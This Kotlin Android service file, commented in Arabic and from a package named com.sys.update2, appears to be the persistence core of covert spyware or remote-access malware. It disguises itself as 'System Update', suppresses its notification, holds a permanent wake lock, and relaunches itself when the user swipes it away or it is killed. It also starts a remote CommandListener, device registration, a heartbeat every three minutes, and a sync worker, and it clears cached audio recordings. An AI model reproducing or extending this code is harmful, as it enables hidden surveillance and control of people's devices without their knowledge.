// language: Kotlin, file: BackgroundService.kt
// *startForeground() يجب أن يُستدعى خلال 5 ثواني من onStartCommand*
// *WakeLock يمنع CPU من النوم — ضروري للسحب المستمر*
// *ServiceWatchdog يعيد الإطلاق كل 15 دقيقة إذا الخدمة اتقتلت*
// *stopWithTask="false" في Manifest يمنع القتل من الـ recents*

package com.sys.update2

import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    @Volatile private var running = false
    @Volatile private var foregroundStarted = false

    private var wakeLock: PowerManager.WakeLock? = null

    private val notificationId = 1001
    private val channelId = "sys_sync_channel"

    override fun onCreate() {
        super.onCreate()

        acquireWakeLock()

        try { CommandListener.start(applicationContext) } catch (_: Exception) {}
        try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}

        startLoops()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!foregroundStarted) {
            val ok = tryStartForeground()
            if (!ok) {
                stopSelf()
                return START_NOT_STICKY
            }
        }

        // تأكد إن الـ watchdog شغال دايماً
        try { ServiceWatchdog.schedule(applicationContext) } catch (_: Exception) {}

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        try { CommandListener.stop() } catch (_: Exception) {}
        try { SyncWorker.stop() } catch (_: Exception) {}
        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
        scope.cancel()

        releaseWakeLock()

        // ⭐ إعادة الإطلاق اليدوي — لأن بعض الأجهزة تتجاهل START_STICKY
        if (shouldRestart()) {
            try {
                val restartIntent = Intent(applicationContext, BackgroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    applicationContext.startForegroundService(restartIntent)
                } else {
                    applicationContext.startService(restartIntent)
                }
            } catch (_: Exception) {}
        }

        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // المستخدم عمل swipe من الـ recents — نعيد الإطلاق
        try {
            val restartIntent = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    private fun shouldRestart(): Boolean {
        // لا نعيد الإطلاق لو التطبيق اتقتل بالكامل (force stop)
        // لكن نعيد لو كان ده مجرد system kill
        return true
    }

    // ═══════════════════════════════════════════
    //  WakeLock
    // ═══════════════════════════════════════════

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "sysupdate::SyncWakeLock"
            )
            wakeLock?.setReferenceCounted(false)
            wakeLock?.acquire()
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
            wakeLock = null
        } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════
    //  Foreground
    // ═══════════════════════════════════════════

    private fun tryStartForeground(): Boolean {
        return try {
            ensureChannel()
            val notif = buildNotification()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // ⭐ dataSync فقط — مفيش location
                try {
                    startForeground(
                        notificationId,
                        notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } catch (_: Exception) {
                    startForeground(notificationId, notif)
                }
            } else {
                startForeground(notificationId, notif)
            }

            foregroundStarted = true
            running = true
            true
        } catch (e: Exception) {
            android.util.Log.e("BgService", "startForeground failed: ${e.message}")
            false
        }
    }

    private fun ensureChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(channelId) != null) return

        val ch = NotificationChannel(
            channelId,
            "System Update",
            NotificationManager.IMPORTANCE_MIN
        )
        ch.setSound(null, null)
        ch.enableVibration(false)
        ch.setShowBadge(false)
        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        nm.createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_white_dot)
            .setContentTitle("System Update")
            .setContentText("Running")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    // ═══════════════════════════════════════════
    //  Loops
    // ═══════════════════════════════════════════

    private fun startLoops() {
        // SyncWorker — بعد 3 ثواني
        scope.launch {
            delay(3_000L)
            if (!running) return@launch
            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
        }

        // Heartbeat — كل 3 دقايق
        scope.launch {
            while (running) {
                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                delay(3 * 60_000L)
            }
        }

        // تنظيف ملفات الكاش
        scope.launch {
            while (running) {
                try {
                    val audioDir = File(applicationContext.cacheDir, "audio")
                    if (audioDir.exists()) {
                        val cutoff = System.currentTimeMillis() - 3600_000L
                        audioDir.listFiles()?.forEach {
                            if (it.lastModified() < cutoff) it.delete()
                        }
                    }
                } catch (_: Exception) {}
                delay(10 * 60_000L)
            }
        }

        // Watchdog داخلي — كل 60 ثانية يتأكد إن SyncWorker شغال
        scope.launch {
            while (running) {
                delay(60_000L)
                if (!running) break
                try {
                    if (!syncWorkerIsRunning()) {
                        SyncWorker.start(applicationContext)
                    }
                } catch (_: Exception) {}
            }
        }

        // WakeLock تجديد — كل 5 دقايق
        scope.launch {
            while (running) {
                delay(5 * 60_000L)
                try {
                    if (wakeLock?.isHeld != true) {
                        acquireWakeLock()
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun syncWorkerIsRunning(): Boolean {
        return try {
            Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
        } catch (_: Exception) {
            true
        }
    }

    companion object {
        fun startSafely(context: Context): Boolean {
            return try {
                val intent = Intent(context, BackgroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                true
            } catch (e: Exception) {
                android.util.Log.e("BgService", "startSafely failed: ${e.message}")
                false
            }
        }

        fun isAppInForeground(context: Context): Boolean {
            return try {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val procs = am.runningAppProcesses ?: return true
                val myPid = android.os.Process.myPid()
                procs.firstOrNull { it.pid == myPid }?.importance ==
                    ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            } catch (_: Exception) {
                true
            }
        }
    }
}
